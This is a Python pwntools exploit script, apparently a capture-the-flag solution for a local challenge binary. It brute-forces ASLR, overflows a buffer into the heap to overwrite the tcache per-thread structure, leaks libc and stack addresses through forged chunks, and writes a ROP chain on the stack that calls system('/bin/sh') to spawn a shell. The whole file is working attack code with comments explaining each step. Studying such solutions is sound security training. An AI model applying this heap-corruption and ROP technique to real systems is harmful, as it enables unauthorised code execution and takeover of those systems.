from pwn import *

context.binary = elf = ELF("./service/chall")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
if args.REMOTE:
    p = remote("localhost", 5000)
else:
    p = process("./service/chall", aslr=True)
stat = log.progress("enum")
i = 0

# brute force ASLR, until BSS and heap is aligned
while True:
    p.sendlineafter(b"Action: ", b"8")
    p.sendlineafter(b"Action: ", b"5")
    p.sendlineafter(b"Action: ", b"6")
    p.sendlineafter(b"Action: ", b"1")

    p.recvuntil(b"Name: ")
    try:
        leak = unpack(p.recvline().split()[1], "all")
    except:
        continue
    i += 1
    stat.status(f"{i} {hex(leak)}")
    if leak == 0x405:
        break

# BSS and Heap is now aligned. We can overflow into the Heap.
stat.success(f"beap found after {i} tries")

p.sendlineafter(b"Action: ", b"2")
p.sendlineafter(b"> ", str(2**31).encode()) # prepare for buffer overflow

# we overflow and overwrite the tcache perthread struct
payload = b"A"*0xe80
# tcache_perthread_struct starts here
payload += p64(0x0) + p64(0x291)
payload += p16(0x0)*15
payload += p16(0x1) # <-- fake count for tcache bins serving chunk size 0x110
payload += p16(0x0)*48
payload += p64(0x0)*15
payload += p64(0x404100) # <-- fake "next" tcache chunk serving chunk size 0x110


p.sendlineafter(b"Action: ", b"7")
p.sendafter(b"reflection?\n", payload) # <-- overflow happens here
# at this point, tcache bin 0x110 will have 1 chunk pointing to 0x404100 (right before life)
p.sendlineafter(b"Action: ", b"3")

# create fake tcache chunk to be freed
p.sendafter(b"> ", b"\x00"*0x8 + p64(0x111) + b"\x00"*0x18 + p64(0x4040e0) + b"\x00"*0x20 + p64(0x404110)) # <-- overwrite name in life struct to 0x4040e0 which points to _IO_2_1_stdout in libc
gdb.attach(p)
p.sendlineafter(b"Action: ", b"1")
p.recvuntil(b"Name: ")
leak = unpack(p.recvuntil(b" ", drop=True), "all") - 2219328 # <-- leak points to a stack address in the TLS
libc.address = leak + 9664
log.info(f"leak @ {hex(leak)}")

p.sendlineafter(b"Action: ", b"4")
p.sendlineafter(b"> ", b"1")

p.sendlineafter(b"Action: ", b"3")
p.sendafter(b"> ", b"\x00"*0x18 + p64(leak))  # <-- do the same as before, overwrite name in life struct to print stack leak

p.sendlineafter(b"Action: ", b"1")
p.recvuntil(b"Name: ")
stack_leak = unpack(p.recvuntil(b" ", drop=True), "all")
log.info(f"stack leak @ {hex(stack_leak)}")

# overwrite tcache perthread struct again to allocate our next 0x110 chunk to the stack for our ROP chain
payload = b"A"*0xe80
payload += p64(0x0) + p64(0x291)
payload += p16(0x0)*15
payload += p16(0x1)
payload += p16(0x0)*48
payload += p64(0x0)*15
payload += p64(stack_leak-0x50)

rop = ROP(libc)
rop.call(rop.ret)
rop.system(next(libc.search(b"/bin/sh\x00")))

p.sendlineafter(b"Action: ", b"2")
p.sendlineafter(b"> ", str(2**31).encode()) # prepare for buffer overflow
p.sendlineafter(b"Action: ", b"7")
p.sendafter(b"reflection?\n", payload)
p.sendlineafter(b"Action: ", b"3")
p.sendlineafter(b"> ", b"A"*8 + rop.chain())

p.interactive()
